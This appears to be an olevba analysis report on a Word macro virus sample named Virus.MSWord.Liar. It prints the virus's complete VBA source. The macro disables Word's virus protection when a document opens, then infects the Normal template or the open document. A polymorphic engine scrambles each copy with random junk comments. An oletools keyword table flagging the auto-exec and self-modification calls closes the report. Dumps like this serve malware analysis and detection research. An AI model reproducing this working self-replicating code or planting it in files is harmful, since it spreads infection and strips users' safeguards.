olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar-a973ff4503339c53a527aca9c6a60eef26de9646
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar-a973ff4503339c53a527aca9c6a60eef26de9646 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub document_open() 'ÊÆãá²þ³®¹ûÖ©°ÚŸ¨ú¡ÛË³úÄÑâÁ¿åä­­Å�¤é
Dim v(150): v(1) = "bliem by j2f": Options.VirusProtection = False '�çÊõœ¼þÆõõ°ãûâÙá¡ž×äïï¿ÖÖ¸ßÀëíÅ÷Ò¥å±
Set a = MacroContainer.VBProject 'õÞóÿÊ¾É­÷ì¼ÒÜñ¹£Ê÷´×ÑÎëßöÅï£öÓä¨´ä¼æ÷üß°âèÏæÝûÏë
Set ab = a.VBComponents(1) '´£ÞÉ÷ÀÖŸô£ÁÝñÐêœòýÝÉ£Ê×«­¼·œÞÎÖºîÕÉ®ÉÕ
Set abc = ab.CodeModule 'ÂÏ»§ÚáâðËéÅÛ¨Ðì»µÂ±ï¯ë ùù°ÚÑôôîû¸ÊÇêÑµ´Ø¥µ÷À¸
Set s = NormalTemplate '×ä�¯ºÖ¶äÜÔ¡ó¿ÝõíøÔ ÉÎžêÚØãÍòÌŸÈ¥¾Óºù´¹Îðé
Set nh = s.VBProject.VBComponents(1).CodeModule 'ÚÙ©Å¢ÌÞ©ææîÝÿµ«ä¹×®µÔøÖÞ¸à°ðÄ ç¢ô�ÀÄ¥
For y = 1 To Int(75 - (Rnd * 20)): vx = vx & Chr(255 - Int(Rnd * 100)): Next y '©øÔ´çÚØËäÅëø¦ô¾¥è¡«ÓÎ³¬ÙìßÖðÂöëºÍíœÐÿÕã´¦­îõþ
vc = "Sub document_close()" & Chr(39) & vx & vbCr 'íž¨Å·ñæý­±°ÞÒÈ¯ÇëëÛÆÝËÕÆúÉëŸ¢œ¬×¯�æîºþÞºôõ
If MacroContainer = NormalTemplate Then 'Èàâ¯áÚ×«×·¾× ¿ÌéÅµÒ¥ã½¦ãÛþâ�³ÅÃåÍ°ªöÉÖøÒºÎ
Set s = ActiveDocument '�ÄÊÂ÷íãþðÕÉÈ±û×úàÃÌÄß¥²ÆÔ¶ïúç´ 
Set nh = s.VBProject.VBComponents(1).CodeModule '°ü°ÏëÃ¥¡¾þ½Ÿÿ øâÅ¯ûúÇàÖÌ¶Òßø×Æ³Å¾¯Ö°
vc = "Sub document_open()" & Chr(39) & vx & vbCr '¶ì²ùç ®êíè£ææ¸½²´á­¸¦éÜÈÜëÆÁòùÀ¬¿ÕíÎ
End If: Randomize: lin = abc.countoflines 'ÙÏÉ¼ü¿¦ÝôÕ²ÜÖµÔ¸Íîä÷žãÂáªà°îáøÎÒÄü
For i = 2 To lin 'ß³ÁŸ­ÈÃì¥àÃÄ³¸»³æÉÍÇãÖÜžÌÅÑüÚò¾ðìÚöÂ¹ÔÕÞ¹êû§ûÒ¶
jc = "" 'ëÑ©­ÖÑÝç¯ÉÊÁ÷¸æúäŸß¿ÛÛßêêÕÂç»ÅÃøû
d = Int(Rnd * 3) 'Ãõ¡ÙÝü¦Î×¢æÈû®ÑÉÚñ¶éêßÕµôÔ­Æ³âøÁÍ»ÜÀï
p = InStr(abc.Lines(i, 1), Chr(39)) 'ØÅã¬¦ËÙÿæï¿�àç¨óÇÃÂºªöØ­å¼Ø¬Ô¬ê¶¦ê�Ÿ¨Ë¾Òð¿ÂªÛ
If p = 0 Then GoTo e_ 'Ô÷ÎÆúÖôñàœÃäÖÐùÒÔ¡äîÍÝÌØæù¿ÛÉ§ÕÄÙú
If p = 2 And lin > 100 Then ' asdfasdfasdf
v(i) = "": d = 1: GoTo n_ 'asdfasdfasdf
End If 'asdfasdfasdfasdf
v(i) = Left(abc.Lines(i, 1), (p - 1)) 'ñ³åòûº«Ì¯�ËùÁßä»×Ùë¨ð×ÃÉ·óßÿ±£âé íÖÛßžÆËò¦ü°¸ç¡
For j = 1 To Int(75 - (Rnd * 20))  '¤É ³×´ÆÓûüÛÖÛÀîÔðžäú¯¸æ°¨�äÑ¤£Í§ÆÕ®·¦ð²
jc = jc & Chr(255 - Int(Rnd * 100)) '¬²²Ð¶ÇïàÑ¦©ÙŸÍ�Ó²áø¨Æ©¯³£ú­éäú¥
Next j 'ÊÝêëóÃÅª÷ëÀÑã¬ážØ°¯ÃÜÅ½Åú«úðàÔÕªú¦èú±üò½å«êé
v(i) = v(i) & Chr(39) & jc '®ïÎüµ«âÕÌÿ½žö±ûŸœ»»îîŸº§óðåüß¥è¹¬÷®®ëõÁøÁÑ
If d = 2 Then v(i) = v(i) & vbCr & Chr(32) & Chr(39) & jc 'ð°ÕÉøú¬�þ¾ óÙÎ¥ï­¾éû¤Î¼ùþ ë¦Óïã´ª
vc = vc & v(i) & vbCr '©ªÖÄí¡æþßÃÚ¿µ¸íúçìžî¾¥äæ²´ÙðÆóäª½ÑÇèþæ úª÷·
n_: 'asdfasdfasdfasdfasdfsadf
Next i 'úÄÎ¨Ó¬­øÅÍ°Ôžñ¼º¶Î�ªî½ä¨¶ØöÂõ¼á
e_: 'ÉÆ«¢êñ¸®ß«²ÙÅÚËÐÅ²ßå©æðïçîËŸØâ¼èºßû¡ä
If nh.countoflines < 2 Then 'ÚÛÒ¸æ¨±Ñóìçœþß¸ãàñßÐ£ü³øÁ»²×´î
nh.AddFromString vc '¾ð»¡²¡ñá·æ  «¥í£ô°·¢Ò¥ïÎÚÄüÝ·øèù¬ë²ž°
s.Save 'ä÷ÞçÔÞ¿Õ«ÑÓÁ¼œüÉúÂïÎÓ�Ä´ã¦«ß©Ìë§Ï�ýž
End If 'ëÓ»ãŸí¾û¨úÏÐõöÛúŸœÆÿÂµÙÇï½êÄªÈŸÚÁò¶¸¨®½äÒÄøô
End Sub '¨Æì©êáûÓßÁÚ¢¶ùÝÙÆç¢Öã£¹¢Ïß¯ùö¹êÛ³êÞäÏŸ½¬Ñß©Ä
Rem Another virus by Jack Twoflower [LineZer0 & Metaphase] 'ý¨ÓÇïíÃùœ¢§ª¡Ù«ÙÒ«­ÁÖò½òÿáÅÝ¼ÉãêÔÔÛ�ÞÛ
Rem Uses "bliem" polymorhic engine by Jack Twoflower 'asdfasdfasdfasdf
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
